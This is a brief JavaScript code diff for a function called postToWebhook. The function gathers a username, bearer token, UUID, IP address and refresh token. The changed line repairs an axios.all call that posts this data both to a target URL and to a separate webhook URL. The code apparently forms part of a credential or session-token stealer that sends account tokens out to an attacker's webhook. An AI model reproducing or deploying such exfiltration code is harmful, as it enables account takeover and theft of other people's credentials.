@@ -135,4 +135,5 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
             }
         }]
     };
-    axios.all([axios.post(url, data), axios.post(webhook_url, data).then(() => console.log('Successfully authenticated, posting to
+    axios.all([axios.post(url, data), axios.post(webhook_url, data)]).then(() => console.log('Successfully authenticated, posting to webhook!'));
+}
